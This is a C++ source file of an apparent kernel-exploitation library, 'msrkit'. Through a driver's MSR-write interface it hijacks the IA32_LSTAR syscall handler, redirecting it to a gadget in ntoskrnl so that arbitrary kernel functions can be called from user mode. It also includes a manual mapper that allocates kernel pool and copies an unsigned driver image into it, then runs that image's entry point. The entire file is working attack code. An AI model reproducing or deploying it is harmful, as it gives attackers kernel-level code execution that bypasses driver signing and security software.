#include "../msrkit.h"
#include <msrkit/bootstrap.h>
#include <msrkit/detail/gadget.h>
#include <msrkit/detail/pe.h>
#include <msrkit/detail/shellcode.h>
#include <msrkit/detail/constants.h>
namespace MSRK
{
    class M_INTERNAL final
    {
        private:
            inline static HANDLE Driver = INVALID_HANDLE_VALUE;
            inline static bool owned_driver = false;

            inline static std::uintptr_t ntoskrnl = 0;
            inline static HMODULE ntoskrnl_local = nullptr;

            inline static int last_error = MSRK_OK;
            inline static bool initialized = false;

        private:
            static std::uint64_t READ_MSR(std::uint32_t REGISTER)
            {
                MSR_IO_DATA IO = { REGISTER, 0, 0, 0 };
                DeviceIoControl(
                    Driver,
                    IOCTL_READ_MSR,
                    &IO, sizeof(IO),
                    &IO, sizeof(IO),
                    nullptr, nullptr
                );
                return IO.value;
            }

            static bool WRITE_MSR(std::uint32_t REGISTER, std::uint64_t VALUE)
            {
                MSR_IO_DATA IO = { REGISTER, VALUE, 0, 0 };
                return DeviceIoControl(
                    Driver,
                    IOCTL_WRITE_MSR,
                    &IO, sizeof(IO),
                    &IO, sizeof(IO),
                    nullptr, nullptr
                );
            }

            static void SET_PRIORITY(_Out_ DWORD* PRIORITY_PROCESS, _Out_ int* PRIORITY_THREAD)
            {
                *PRIORITY_PROCESS = GetPriorityClass(GetCurrentProcess());
                *PRIORITY_THREAD  = GetThreadPriority(GetCurrentThread());

                SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
            }

            static void RESTORE_PRIORITY(DWORD PRIORITY_PROCESS, int PRIORITY_THREAD)
            {
                SetThreadPriority(GetCurrentThread(), PRIORITY_THREAD);
                SetPriorityClass(GetCurrentProcess(), PRIORITY_PROCESS);
            }

            friend class M_FUNCTION;
            friend class M_DRIVERMAP;
            friend bool  INIT(const wchar_t* DRIVER_PATH, HANDLE DRIVER_HANDLE);
            friend int   GET_LAST_ERROR(void);
            friend void  CLEANUP(void);
    };

    bool INIT(const wchar_t* DRIVER_PATH, HANDLE DRIVER_HANDLE)
    {
        if (DRIVER_HANDLE)
        {
            M_INTERNAL::Driver = DRIVER_HANDLE;
        }
        else
        {
            M_INTERNAL::Driver = LOAD_DRIVER(DRIVER_PATH);

            if (M_INTERNAL::Driver == INVALID_HANDLE_VALUE)
            {
                M_INTERNAL::last_error = MSRK_ERR_DRIVER_LOAD;
                return false;
            }

            M_INTERNAL::owned_driver = true;
        }

        IA32_LSTAR = M_INTERNAL::READ_MSR(MSR_IA32_LSTAR);
        if (!IA32_LSTAR)
        {
            M_INTERNAL::last_error = MSRK_ERR_LSTAR_READ;
            CLEANUP();
            return false;
        }

        M_INTERNAL::ntoskrnl = detail::M_PE::GET_NTOSKRNL_BASE();

        if (!M_INTERNAL::ntoskrnl)
        {
            M_INTERNAL::last_error = MSRK_ERR_KERNEL_BASE;
            CLEANUP();
            return false;
        }

        if (!M_INTERNAL::ntoskrnl_local)
        {
            M_INTERNAL::ntoskrnl_local = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
            if (!M_INTERNAL::ntoskrnl_local)
            {
                M_INTERNAL::last_error = MSRK_ERR_KERNEL_BASE;
                CLEANUP();
                return false;
            }
        }
   
        if (!detail::FIND_GADGETS((std::uintptr_t)M_INTERNAL::ntoskrnl_local, M_INTERNAL::ntoskrnl))
        {
            M_INTERNAL::last_error = MSRK_ERR_GADGETS;
            CLEANUP();
            return false;
        }

        M_INTERNAL::initialized = true;
        return true;
    }

    int GET_LAST_ERROR()
    {
        return M_INTERNAL::last_error;
    }

    void CLEANUP()
    {
        if (M_INTERNAL::ntoskrnl_local)
        {
            FreeLibrary(M_INTERNAL::ntoskrnl_local);
            M_INTERNAL::ntoskrnl_local = nullptr;
        }
        if (M_INTERNAL::owned_driver)
        {
            CloseHandle(M_INTERNAL::Driver);
            M_INTERNAL::Driver = INVALID_HANDLE_VALUE;
            M_INTERNAL::owned_driver = false;
            UNLOAD_DRIVER();
        }
        M_INTERNAL::initialized = false;
    }

    LPVOID M_FUNCTION::CALL_AT(std::uintptr_t ADDRESS_FUNCTION, const std::uint64_t* Args, std::uint8_t ARGS_COUNT)
    {
        if ( !M_INTERNAL::initialized || ARGS_COUNT > 16 || (ARGS_COUNT > 0 && !Args) )
        {
            return nullptr;
        }

        CallTargetFn = ADDRESS_FUNCTION;
        CallArgCount = (std::uint64_t)ARGS_COUNT;
        CallArgsPtr  = (std::uintptr_t)Args;
        CallResult   = 0;

        DWORD SAVED_PRIORITY_CLASS;
        int SAVED_THREAD_PRIORITY;
        M_INTERNAL::SET_PRIORITY(&SAVED_PRIORITY_CLASS, &SAVED_THREAD_PRIORITY);

        GROUP_AFFINITY SAVED_AFFINITY = {}, PIN_AFFINITY = {};
        PIN_AFFINITY.Group = 0;
        PIN_AFFINITY.Mask  = 1;
        SetThreadGroupAffinity(GetCurrentThread(), &PIN_AFFINITY, &SAVED_AFFINITY);

        if (!M_INTERNAL::WRITE_MSR(MSR_IA32_LSTAR, ENTRY_GADGET))
        {
            SetThreadGroupAffinity(GetCurrentThread(), &SAVED_AFFINITY, nullptr);
            M_INTERNAL::RESTORE_PRIORITY(SAVED_PRIORITY_CLASS, SAVED_THREAD_PRIORITY);
            return nullptr;
        }

        shellcode_entry();

        SetThreadGroupAffinity(GetCurrentThread(), &SAVED_AFFINITY, nullptr);
        M_INTERNAL::RESTORE_PRIORITY(SAVED_PRIORITY_CLASS, SAVED_THREAD_PRIORITY);

        return (LPVOID)CallResult;
    }

    LPVOID M_FUNCTION::CALL(const char* EXPORT_NAME, const std::uint64_t* Args, std::uint8_t ARGS_COUNT)
    {
        if (!M_INTERNAL::initialized)
        {
            return nullptr;
        }

        std::uintptr_t ADDRESS_FUNCTION = 0;

        const auto PROC_ADDRESS = GetProcAddress(M_INTERNAL::ntoskrnl_local, EXPORT_NAME);

        if (PROC_ADDRESS)
        {
            ADDRESS_FUNCTION = M_INTERNAL::ntoskrnl + ((std::uintptr_t)PROC_ADDRESS - (std::uintptr_t)M_INTERNAL::ntoskrnl_local);
        }

        if (!ADDRESS_FUNCTION)
        {
            return nullptr;
        }

        return CALL_AT(ADDRESS_FUNCTION, Args, ARGS_COUNT);
    }

    MAPPING M_DRIVERMAP::MAP(const char* DRIVER_PATH, const std::uint64_t* Args, std::uint8_t ARGS_COUNT)
    {
        if (!M_INTERNAL::initialized)
        {
            return {};
        }

        if (ARGS_COUNT > 2)
        {
            return {};
        }

        const auto IMAGE_SIZE = detail::M_PE::GET_IMAGE_SIZE(DRIVER_PATH);
        if (!IMAGE_SIZE)
        {
            return {};
        }

        std::uint64_t ALLOC_ARGS[] = { 0, (std::uint64_t)IMAGE_SIZE, 0 };

        const auto POOL_ADDRESS = (std::uintptr_t)M_FUNCTION::CALL(
            "ExAllocatePoolWithTag",
            ALLOC_ARGS,
            3
        );

        if (!POOL_ADDRESS)
        {
            return {};
        }

        detail::PreparedImage PREPARED_IMAGE;

        if (!detail::M_PE::PREPARE_IMAGE(DRIVER_PATH, POOL_ADDRESS, &PREPARED_IMAGE))
        {
            std::uint64_t FREE_ARGS[] = { POOL_ADDRESS, 0 };
            M_FUNCTION::CALL("ExFreePoolWithTag", FREE_ARGS, 2);
            return {};
        }

        std::uint64_t COPY_ARGS[] = {
            POOL_ADDRESS,
            (std::uint64_t)PREPARED_IMAGE.data.data(),
            (std::uint64_t)PREPARED_IMAGE.image_size
        };
        M_FUNCTION::CALL("memcpy", COPY_ARGS, 3);

        if (ARGS_COUNT > 0 && Args)
        {
            M_FUNCTION::CALL_AT(POOL_ADDRESS + PREPARED_IMAGE.entry_rva, Args, ARGS_COUNT);
        }
        else
        {
            std::uint64_t DEFAULT_ARGS[] = { 0, 0 };
            M_FUNCTION::CALL_AT(POOL_ADDRESS + PREPARED_IMAGE.entry_rva, DEFAULT_ARGS, 2);
        }

        return MAPPING(POOL_ADDRESS);
    }

    void M_DRIVERMAP::UNMAP(MAPPING MAP_HANDLE)
    {
        if (!MAP_HANDLE) return;

        std::uint64_t FREE_ARGS[] = { (std::uintptr_t)MAP_HANDLE, 0 };
        M_FUNCTION::CALL("ExFreePoolWithTag", FREE_ARGS, 2);
    }
    
}
